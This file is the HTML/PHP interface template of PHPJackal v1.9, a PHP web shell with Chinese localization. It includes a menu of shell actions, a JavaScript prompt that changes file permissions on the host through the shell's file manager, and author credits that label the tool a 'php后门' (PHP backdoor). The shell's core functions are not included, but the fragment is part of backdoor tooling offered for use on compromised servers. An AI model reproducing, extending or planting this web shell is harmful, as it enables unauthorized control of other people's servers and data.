<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf8">
<title>PHPJackal [<?php echo $workPath; ?>]</title>
<style>
body{scrollbar-base-color: #484848; scrollbar-arrow-color: #FFFFFF; scrollbar-track-color: #969696;font-size:16px;font-family:"Arial Narrow";}
Table {font-size: 15px;} 
.buttons{font-family:Verdana;font-size:10pt;font-weight:normal;font-style:normal;color:#FFFFFF;background-color:#555555;border-style:solid;border-width:1px;border-color:#FFFFFF;}
textarea{border: 0px #000000 solid;background: #EEEEEE;color: #000000;}
input{background: #EEEEEE;border-width:1px;border-style:solid;border-color:black}
select{background: #EEEEEE; border: 0px #000000 none;}
</style>

<script language="JavaScript" type="text/JavaScript">
function HS(box){
if(document.getElementById(box).style.display!="none"){
document.getElementById(box).style.display="none";
document.getElementById('lk').innerHTML="+";
}
else{
document.getElementById(box).style.display="";
document.getElementById('lk').innerHTML="-";
}
}
function chmoD($file){
$ch=prompt("Changing file mode["+$file+"]: ex. 777","");
if($ch != null)location.href="<?php
echo hlinK('seC=fm&workingdiR=' . addslashes($workPath) . '&chmoD=');
?>"+$file+"&modE="+$ch;
}
</script>
</head>
<body text="#E2E2E2" bgcolor="#C0C0C0" link="#DCDCDC" vlink="#DCDCDC" alink="#DCDCDC">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#282828" bgcolor="#333333" width="100%">
  <tr>
    <td>
      <?php foreach ($actions as $action => $info) { ?>
      <a href="<?php echo $baseUrl . 'action=' . $action . '&workPath=' . $workPath; ?>">[<?php echo $info; ?>]</a><?php if ($action != 'logout') { echo ' - '; } ?>
      <?php } ?>
    </td>
  </tr>
</table>
<hr size=1 noshade>
<center>
  <table border="0" style="border-collapse: collapse">
    <tbody>
      <tr>
        <td bgcolor="#666666">
          <b>脚本:</b><br>-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=-<br>
          <b>名称:</b> PHPJackal<br><b>Version:</b> 1.9<br><br>
          <b>作者:</b><br>-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=-<br>
          <b>姓名:</b> NetJackal<br>
          <b>国家:</b> 伊朗<br>
          <b>主页:</b> <a target="_blank" href="http://netjackal.by.ru/">http://netjackal.by.ru/</a><br>
          <b>Email:</b> <a href="mailto:nima_501@yahoo.com?subject=PHPJackal">nima_501@yahoo.com</a><br><br>
          <b>汉化作者:</b><br>-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=-<br>
          <b>姓名:</b> 来福儿<br>
          <b>国家:</b> 中国<br>
          <b>主页:</b> <a target="_blank" href="http://www.laifuer.cn/">http://www.laifuer.cn/</a><br>
          <b>Email:</b> <a href="mailto:laifuer@gmail.com?suject=php后门">laifuer@gmail.com</a><br>
        </td>
      </tr>
    </tbody>
  </table>
</center>

<br />
<table width="100%" cellspacing="0" cellpadding="0" border="0" bgcolor="#333333" style="border-collapse: collapse">
  <tbody>
    <tr>
      <td align="center">PHPJackal v1.9 - Powered By <a target="_blank" href="http://netjackal.by.ru/">NetJackal</a> 汉化: <a target="_blank" href="http://www.laifuer.cn">来福儿</a></td>
      <noscript>-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=-<br><b>错误: 请打开您的浏览器的 JavaScript 支持!!!</b></noscript>
    </tr>
  </tbody>
</table>
</body>
</html>

